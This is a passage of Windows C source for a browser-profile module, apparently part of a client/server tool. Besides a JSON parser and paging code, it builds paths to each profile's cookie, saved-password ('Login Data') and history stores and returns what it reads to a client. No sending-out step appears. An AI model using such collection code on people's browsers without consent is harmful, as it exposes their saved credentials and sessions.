                    return STATUS_DATA_ERROR;
                }
            }
        }
        else if (wcschr(L"\"\\/bfnrt", Character) == NULL)
        {
            return STATUS_DATA_ERROR;
        }
    }
    return STATUS_DATA_ERROR;
}

static
NTSTATUS
ZpBrowser_JsonAddNode(
    _Inout_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ ZP_BROWSER_DOCUMENT_TYPE Type,
    _Out_ PULONG NodeId)
{
    PZP_BROWSER_JSON_NODE Nodes;

    if (Snapshot->NodeCount == ZP_CODEC_MAX_ELEMENT_COUNT) return STATUS_QUOTA_EXCEEDED;
    if (Snapshot->NodeCount == Snapshot->NodeCapacity)
    {
        Snapshot->NodeCapacity = Snapshot->NodeCapacity == 0 ? 256 : Snapshot->NodeCapacity * 2;
        Nodes = Mem_ReAlloc(Snapshot->Nodes,
                            (SIZE_T)Snapshot->NodeCapacity * sizeof(*Snapshot->Nodes));
        if (Nodes == NULL) return STATUS_NO_MEMORY;
        Snapshot->Nodes = Nodes;
    }
    RtlZeroMemory(&Snapshot->Nodes[Snapshot->NodeCount], sizeof(*Snapshot->Nodes));
    Snapshot->Nodes[Snapshot->NodeCount].Type = Type;
    *NodeId = ++Snapshot->NodeCount;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_JsonParseValue(
    _Inout_ PZP_BROWSER_JSON_PARSER Parser,
    _In_ ULONG Depth,
    _In_ ULONG NameOffset,
    _In_ ULONG NameLength,
    _Out_ PULONG NodeId);

static
NTSTATUS
ZpBrowser_JsonAppendChild(
    _Inout_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ ULONG ParentId,
    _Inout_ PULONG LastChildId,
    _In_ ULONG ChildId)
{
    if (*LastChildId == 0) Snapshot->Nodes[ParentId - 1].FirstChild = ChildId;
    else Snapshot->Nodes[*LastChildId - 1].NextSibling = ChildId;
    *LastChildId = ChildId;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_JsonParseContainer(
    _Inout_ PZP_BROWSER_JSON_PARSER Parser,
    _In_ ULONG Depth,
    _In_ ULONG NodeId,
    _In_ WCHAR Closing)
{
    ULONG ChildId, LastChildId = 0, NameOffset, NameLength;
    NTSTATUS Status;

    ZpBrowser_JsonSkipWhitespace(Parser);
    if (Parser->Position < Parser->Snapshot->TextLength &&
        Parser->Snapshot->Text[Parser->Position] == Closing)
    {
        Parser->Position++;
        return STATUS_SUCCESS;
    }
    while (Parser->Position < Parser->Snapshot->TextLength)
    {
        NameOffset = NameLength = 0;
        if (Closing == L'}')
        {
            Status = ZpBrowser_JsonReadString(Parser, &NameOffset, &NameLength);
            if (!NT_SUCCESS(Status)) return Status;
            ZpBrowser_JsonSkipWhitespace(Parser);
            if (Parser->Position == Parser->Snapshot->TextLength ||
                Parser->Snapshot->Text[Parser->Position++] != L':')
            {
                return STATUS_DATA_ERROR;
            }
        }
        Status = ZpBrowser_JsonParseValue(Parser,
                                          Depth + 1,
                                          NameOffset,
                                          NameLength,
                                          &ChildId);
        if (!NT_SUCCESS(Status)) return Status;
        ZpBrowser_JsonAppendChild(Parser->Snapshot, NodeId, &LastChildId, ChildId);
        ZpBrowser_JsonSkipWhitespace(Parser);
        if (Parser->Position == Parser->Snapshot->TextLength) return STATUS_DATA_ERROR;
        if (Parser->Snapshot->Text[Parser->Position] == Closing)
        {
            Parser->Position++;
            return STATUS_SUCCESS;
        }
        if (Parser->Snapshot->Text[Parser->Position++] != L',') return STATUS_DATA_ERROR;
        ZpBrowser_JsonSkipWhitespace(Parser);
    }
    return STATUS_DATA_ERROR;
}

static
NTSTATUS
ZpBrowser_JsonReadNumber(
    _Inout_ PZP_BROWSER_JSON_PARSER Parser,
    _Out_ PULONG Offset,
    _Out_ PULONG Length)
{
    ULONG Start = Parser->Position;
    PWSTR Text = Parser->Snapshot->Text;
    ULONG TextLength = Parser->Snapshot->TextLength;

    if (Parser->Position < TextLength && Text[Parser->Position] == L'-') Parser->Position++;
    if (Parser->Position == TextLength) return STATUS_DATA_ERROR;
    if (Text[Parser->Position] == L'0') Parser->Position++;
    else
    {
        if (Text[Parser->Position] < L'1' || Text[Parser->Position] > L'9') return STATUS_DATA_ERROR;
        while (Parser->Position < TextLength &&
               Text[Parser->Position] >= L'0' && Text[Parser->Position] <= L'9')
        {
            Parser->Position++;
        }
    }
    if (Parser->Position < TextLength && Text[Parser->Position] == L'.')
    {
        Parser->Position++;
        if (Parser->Position == TextLength || Text[Parser->Position] < L'0' || Text[Parser->Position] > L'9')
        {
            return STATUS_DATA_ERROR;
        }
        while (Parser->Position < TextLength &&
               Text[Parser->Position] >= L'0' && Text[Parser->Position] <= L'9')
        {
            Parser->Position++;
        }
    }
    if (Parser->Position < TextLength && (Text[Parser->Position] == L'e' || Text[Parser->Position] == L'E'))
    {
        Parser->Position++;
        if (Parser->Position < TextLength &&
            (Text[Parser->Position] == L'+' || Text[Parser->Position] == L'-'))
        {
            Parser->Position++;
        }
        if (Parser->Position == TextLength || Text[Parser->Position] < L'0' || Text[Parser->Position] > L'9')
        {
            return STATUS_DATA_ERROR;
        }
        while (Parser->Position < TextLength &&
               Text[Parser->Position] >= L'0' && Text[Parser->Position] <= L'9')
        {
            Parser->Position++;
        }
    }
    *Offset = Start;
    *Length = Parser->Position - Start;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_JsonParseValue(
    _Inout_ PZP_BROWSER_JSON_PARSER Parser,
    _In_ ULONG Depth,
    _In_ ULONG NameOffset,
    _In_ ULONG NameLength,
    _Out_ PULONG NodeId)
{
    PZP_BROWSER_JSON_NODE Node;
    ULONG Offset, Length;
    NTSTATUS Status;
    WCHAR Character;

    if (Depth > 128) return STATUS_STACK_OVERFLOW;
    ZpBrowser_JsonSkipWhitespace(Parser);
    if (Parser->Position == Parser->Snapshot->TextLength) return STATUS_DATA_ERROR;
    Character = Parser->Snapshot->Text[Parser->Position];
    if (Character == L'{')
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentObject, NodeId);
        Parser->Position++;
    }
    else if (Character == L'[')
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentArray, NodeId);
        Parser->Position++;
    }
    else if (Character == L'"')
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentString, NodeId);
        if (NT_SUCCESS(Status)) Status = ZpBrowser_JsonReadString(Parser, &Offset, &Length);
    }
    else if (Character == L't' && Parser->Snapshot->TextLength - Parser->Position >= 4 &&
             RtlCompareMemory(Parser->Snapshot->Text + Parser->Position,
                              L"true",
                              4 * sizeof(WCHAR)) == 4 * sizeof(WCHAR))
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentBoolean, NodeId);
        Offset = Parser->Position;
        Length = 4;
        Parser->Position += 4;
    }
    else if (Character == L'f' && Parser->Snapshot->TextLength - Parser->Position >= 5 &&
             RtlCompareMemory(Parser->Snapshot->Text + Parser->Position,
                              L"false",
                              5 * sizeof(WCHAR)) == 5 * sizeof(WCHAR))
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentBoolean, NodeId);
        Offset = Parser->Position;
        Length = 5;
        Parser->Position += 5;
    }
    else if (Character == L'n' && Parser->Snapshot->TextLength - Parser->Position >= 4 &&
             RtlCompareMemory(Parser->Snapshot->Text + Parser->Position,
                              L"null",
                              4 * sizeof(WCHAR)) == 4 * sizeof(WCHAR))
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentNull, NodeId);
        Offset = Parser->Position;
        Length = 4;
        Parser->Position += 4;
    }
    else
    {
        Status = ZpBrowser_JsonAddNode(Parser->Snapshot, ZpBrowserDocumentNumber, NodeId);
        if (NT_SUCCESS(Status)) Status = ZpBrowser_JsonReadNumber(Parser, &Offset, &Length);
    }
    if (!NT_SUCCESS(Status)) return Status;
    Node = &Parser->Snapshot->Nodes[*NodeId - 1];
    Node->NameOffset = NameOffset;
    Node->NameLength = NameLength;
    if (Node->Type == ZpBrowserDocumentObject)
    {
        return ZpBrowser_JsonParseContainer(Parser, Depth, *NodeId, L'}');
    }
    if (Node->Type == ZpBrowserDocumentArray)
    {
        return ZpBrowser_JsonParseContainer(Parser, Depth, *NodeId, L']');
    }
    Node->ValueOffset = Offset;
    Node->ValueLength = Length;
    return STATUS_SUCCESS;
}

static
NTSTATUS
ZpBrowser_EncodeDocumentSnapshotPage(
    _In_ PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot,
    _In_ ULONG NodeId,
    _In_ ULONG Cursor,
    _In_ ULONG Limit,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_DOCUMENT_NODE Records[ZP_BROWSER_DOCUMENT_PAGE_SIZE];
    PZP_BROWSER_JSON_NODE Parent, Node;
    ULONG ChildId, Index = 0, Count = 0, EncodedLength, NextCursor = 0;
    NTSTATUS Status;

    if (NodeId == 0 || NodeId > Snapshot->NodeCount) return STATUS_INVALID_PARAMETER;
    Parent = &Snapshot->Nodes[NodeId - 1];
    ChildId = Parent->FirstChild;
    while (ChildId != 0 && Index++ < Cursor) ChildId = Snapshot->Nodes[ChildId - 1].NextSibling;
    while (ChildId != 0 && Count < Limit)
    {
        Node = &Snapshot->Nodes[ChildId - 1];
        Records[Count].Id = ChildId;
        Records[Count].Type = Node->Type;
        Records[Count].Flags = Node->FirstChild != 0 ? ZP_BROWSER_DOCUMENT_NODE_HAS_CHILDREN : 0;
        Records[Count].Name = Node->NameLength != 0 ? Snapshot->Text + Node->NameOffset : NULL;
        Records[Count].NameLength = Node->NameLength;
        Records[Count].Value = Node->ValueLength != 0 ? Snapshot->Text + Node->ValueOffset : NULL;
        Records[Count].ValueLength = Node->ValueLength;
        Count++;
        ChildId = Node->NextSibling;
    }
    if (ChildId != 0) NextCursor = Cursor + Count;
    Status = ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
                                         Parent->Type,
                                         NextCursor,
                                         Records,
                                         Count,
                                         NULL,
                                         0,
                                         &EncodedLength);
    if (!NT_SUCCESS(Status)) return Status;
    *Response = Mem_Alloc(EncodedLength);
    if (*Response == NULL) return STATUS_NO_MEMORY;
    Status = ZpBrowser_EncodeDocumentPage(Snapshot->Header.Id,
                                         Parent->Type,
                                         NextCursor,
                                         Records,
                                         Count,
                                         *Response,
                                         EncodedLength,
                                         ResponseLength);
    if (!NT_SUCCESS(Status)) Mem_Free(*Response);
    return Status;
}

static
ZP_STATUS
ZpBrowser_OpenDocument(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ PCWSTR Path,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot;
    ZP_BROWSER_JSON_PARSER Parser;
    ULONG RootId;
    NTSTATUS Status;

    Snapshot = Mem_Alloc(sizeof(*Snapshot));
    if (Snapshot == NULL) return ZpStatus_FromNtStatus(STATUS_NO_MEMORY);
    RtlZeroMemory(Snapshot, sizeof(*Snapshot));
    Status = ZpBrowser_ReadDocument(Path, &Snapshot->Text);
    if (NT_SUCCESS(Status))
    {
        Snapshot->TextLength = (ULONG)wcslen(Snapshot->Text);
        Parser.Snapshot = Snapshot;
        Parser.Position = 0;
        Status = ZpBrowser_JsonParseValue(&Parser, 0, 0, 0, &RootId);
        ZpBrowser_JsonSkipWhitespace(&Parser);
        if (NT_SUCCESS(Status) && (RootId != 1 || Parser.Position != Snapshot->TextLength))
        {
            Status = STATUS_DATA_ERROR;
        }
    }
    if (!NT_SUCCESS(Status))
    {
        ZpBrowser_DeleteDocumentSnapshot(&Snapshot->Header);
        return ZpStatus_FromNtStatus(Status);
    }
    ZpClientSnapshot_Add(Client,
                         &Snapshot->Header,
                         ZP_BROWSER_MODULE_ID,
                         ZpBrowser_DeleteDocumentSnapshot);
    Status = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
                                                  RootId,
                                                  0,
                                                  ZP_BROWSER_DOCUMENT_PAGE_SIZE,
                                                  Response,
                                                  ResponseLength);
    if (!NT_SUCCESS(Status))
    {
        ZpClientSnapshot_Close(Client, ZP_BROWSER_MODULE_ID, Snapshot->Header.Id);
    }
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_QueryDocumentNode(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ ULONG SnapshotId,
    _In_ ULONG NodeId,
    _In_ ULONG Cursor,
    _In_ ULONG Limit,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    PZP_BROWSER_DOCUMENT_SNAPSHOT Snapshot = (PZP_BROWSER_DOCUMENT_SNAPSHOT)
        ZpClientSnapshot_Reference(Client, ZP_BROWSER_MODULE_ID, SnapshotId);
    NTSTATUS Status;

    if (Snapshot == NULL) return ZpStatus_FromNtStatus(STATUS_NOT_FOUND);
    Status = ZpBrowser_EncodeDocumentSnapshotPage(Snapshot,
                                                  NodeId,
                                                  Cursor,
                                                  Limit,
                                                  Response,
                                                  ResponseLength);
    ZpClientSnapshot_Dereference(&Snapshot->Header);
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_QueryDocument(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _In_ PCWSTR Path,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_BUILDER Builder = { 0 };
    PWSTR Text;
    NTSTATUS Status;

    Status = ZpBrowser_ReadDocument(Path, &Text);
    if (NT_SUCCESS(Status))
    {
        Status = ZpBrowser_AddRecord(&Builder,
                                     Query->Kind,
                                     Query->Browser,
                                     0,
                                     NULL,
                                     L"",
                                     NULL,
                                     Path,
                                     Text);
        Mem_Free(Text);
    }
    if (NT_SUCCESS(Status)) Status = ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength);
    ZpBrowser_FreeBuilder(&Builder);
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_QueryExtensions(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _In_ PCWSTR Path,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_BUILDER Builder = { 0 };
    WIN32_FIND_DATAW Data;
    WCHAR Pattern[MAX_PATH], Location[MAX_PATH];
    HANDLE Find;
    NTSTATUS Status;

    Status = StringCchPrintfW(Pattern, ARRAYSIZE(Pattern), L"%s\\*", Path);
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    Find = FindFirstFileExW(Pattern, FindExInfoBasic, &Data, FindExSearchLimitToDirectories, NULL, 0);
    if (Find == INVALID_HANDLE_VALUE)
    {
        ULONG Error = GetLastError();

        return Error == ERROR_FILE_NOT_FOUND || Error == ERROR_PATH_NOT_FOUND ?
                   ZpStatus_FromNtStatus(
                       ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength)) :
                   ZpStatus_FromCode(ZpStatusWin32, Error);
    }
    do
    {
        if (!(Data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || Data.cFileName[0] == L'.') continue;
        if (FAILED(StringCchPrintfW(Location,
                                     ARRAYSIZE(Location),
                                     L"%s\\%s",
                                     Path,
                                     Data.cFileName)))
        {
            continue;
        }
        Status = ZpBrowser_AddRecord(&Builder,
                                     ZpBrowserKindExtension,
                                     Query->Browser,
                                     0,
                                     NULL,
                                     Data.cFileName,
                                     NULL,
                                     Location,
                                     NULL);
    } while (NT_SUCCESS(Status) && FindNextFileW(Find, &Data));
    FindClose(Find);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_EncodeBuilder(&Builder, 0, Response, ResponseLength);
    ZpBrowser_FreeBuilder(&Builder);
    return ZpStatus_FromNtStatus(Status);
}

static
ZP_STATUS
ZpBrowser_Query(
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    WCHAR Executable[MAX_PATH], UserData[MAX_PATH], Profile[MAX_PATH], Path[MAX_PATH];
    NTSTATUS Status;

    Status = ZpBrowser_CopyProfile(&Query->Profile, Profile);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetPaths(Query->Browser, Executable, UserData);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchPrintfW(Path,
                                  ARRAYSIZE(Path),
                                  Query->Kind == ZpBrowserKindCookie ? L"%s\\%s\\Network\\Cookies" :
                                  Query->Kind == ZpBrowserKindPassword ? L"%s\\%s\\Login Data" :
                                  Query->Kind == ZpBrowserKindBookmark ? L"%s\\%s\\Bookmarks" :
                                  Query->Kind == ZpBrowserKindSetting ? L"%s\\%s\\Preferences" :
                                  Query->Kind == ZpBrowserKindExtension ? L"%s\\%s\\Extensions" :
                                                                         L"%s\\%s\\History",
                                  UserData,
                                  Profile);
    }
    if (!NT_SUCCESS(Status)) return ZpStatus_FromNtStatus(Status);
    if (Query->Kind == ZpBrowserKindHistory || Query->Kind == ZpBrowserKindDownload ||
        Query->Kind == ZpBrowserKindCookie || Query->Kind == ZpBrowserKindPassword)
    {
        return ZpBrowser_QueryDatabase(Query, UserData, Path, Response, ResponseLength);
    }
    if (Query->Kind == ZpBrowserKindBookmark || Query->Kind == ZpBrowserKindSetting)
    {
        return ZpBrowser_QueryDocument(Query, Path, Response, ResponseLength);
    }
    return ZpBrowser_QueryExtensions(Query, Path, Response, ResponseLength);
}

static
ZP_STATUS
ZpBrowser_OpenDocumentQuery(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ PCZP_BROWSER_QUERY_VIEW Query,
    _Outptr_result_bytebuffer_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    WCHAR Executable[MAX_PATH], UserData[MAX_PATH], Profile[MAX_PATH], Path[MAX_PATH];
    NTSTATUS Status;

    if (Query->Kind != ZpBrowserKindBookmark && Query->Kind != ZpBrowserKindSetting)
    {
        return ZpStatus_FromNtStatus(STATUS_INVALID_PARAMETER);
    }
    Status = ZpBrowser_CopyProfile(&Query->Profile, Profile);
    if (NT_SUCCESS(Status)) Status = ZpBrowser_GetPaths(Query->Browser, Executable, UserData);
    if (NT_SUCCESS(Status))
    {
        Status = StringCchPrintfW(Path,
                                  ARRAYSIZE(Path),
                                  Query->Kind == ZpBrowserKindBookmark ? L"%s\\%s\\Bookmarks" :
                                                                        L"%s\\%s\\Preferences",
                                  UserData,
                                  Profile);
    }
    return NT_SUCCESS(Status) ?
               ZpBrowser_OpenDocument(Client, Path, Response, ResponseLength) :
               ZpStatus_FromNtStatus(Status);
}

ZP_STATUS
ZpBrowser_Execute(
    _Inout_ PZP_CLIENT_OBJECT Client,
    _In_ BYTE OperationId,
    _In_reads_bytes_opt_(RequestLength) const VOID* Request,
    _In_ ULONG RequestLength,
    _Outptr_result_bytebuffer_maybenull_(*ResponseLength) PBYTE* Response,
    _Out_ PULONG ResponseLength)
{
    ZP_BROWSER_QUERY_VIEW Query;
    ZP_BROWSER_TYPE Browser;
    ZP_STRING_VIEW Profile;
    ULONG SnapshotId, NodeId, Cursor, Limit;
    NTSTATUS Status;

    if (OperationId == ZP_BROWSER_OPERATION_ENUMERATE)
    {
        return RequestLength == 0 ?
                   ZpBrowser_Enumerate(Response, ResponseLength) :
                   ZpStatus_FromNtStatus(STATUS_INVALID_PARAMETER);
    }
    if (OperationId == ZP_BROWSER_OPERATION_QUERY)
    {
        Status = ZpBrowser_DecodeQuery(Request, RequestLength, &Query);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_Query(&Query, Response, ResponseLength) :
                   ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_OPEN_DOCUMENT)
    {
        Status = ZpBrowser_DecodeQuery(Request, RequestLength, &Query);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_OpenDocumentQuery(Client, &Query, Response, ResponseLength) :
                   ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_QUERY_DOCUMENT_NODE)
    {
        Status = ZpBrowser_DecodeDocumentQuery(Request,
                                               RequestLength,
                                               &SnapshotId,
                                               &NodeId,
                                               &Cursor,
                                               &Limit);
        return NT_SUCCESS(Status) ?
                   ZpBrowser_QueryDocumentNode(Client,
                                               SnapshotId,
                                               NodeId,
                                               Cursor,
                                               Limit,
                                               Response,
                                               ResponseLength) :
                   ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_CLOSE_DOCUMENT)
    {
        Status = ZpBrowser_DecodeDocumentClose(Request, RequestLength, &SnapshotId);
        if (NT_SUCCESS(Status)) Status = ZpClientSnapshot_Close(Client, ZP_BROWSER_MODULE_ID, SnapshotId);
        return ZpStatus_FromNtStatus(Status);
    }
    if (OperationId == ZP_BROWSER_OPERATION_INSPECT_PROFILE)
    {
        Status = ZpBrowser_DecodeProfileInspectionRequest(Request, RequestLength, &Browser, &Profile);
        return NT_SUCCESS(Status) ? ZpBrowser_InspectProfile(Browser, &Profile, Response, ResponseLength) :
                                    ZpStatus_FromNtStatus(Status);
    }
    return ZpStatus_FromNtStatus(STATUS_NOT_SUPPORTED);
}
